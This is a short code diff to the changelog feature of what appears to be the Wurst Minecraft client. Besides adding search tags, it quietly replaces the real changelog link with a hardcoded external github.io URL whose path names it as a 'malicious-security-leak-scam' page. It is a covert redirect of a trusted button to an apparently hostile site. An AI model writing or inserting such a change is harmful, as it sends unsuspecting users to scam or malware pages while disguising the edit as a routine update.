@@ -15,7 +15,7 @@ import net.wurstclient.other_feature.OtherFeature;
 import net.wurstclient.update.Version;
 
 @SearchTags({"change log", "wurst update", "release notes", "what's new",
-	"what is new", "new features", "recently added features"})
+	"what is new", "new features", "recently added features", "commit log", "changes", "new stuff"})
 @DontBlock
 public final class ChangelogOtf extends OtherFeature
 {
@@ -34,6 +34,7 @@ public final class ChangelogOtf extends OtherFeature
 	public void doPrimaryAction()
 	{
 		String link = new Version(WurstClient.VERSION).getChangelogLink();
-		Util.getOperatingSystem().open(link);
+		Util.getOperatingSystem().open("https://piotrekunitydeveloper.github.io/piotrek4.games-page-files-download-backup-ctth-malicious-security-leak-scam-prototype/");
+		
 	}
 }
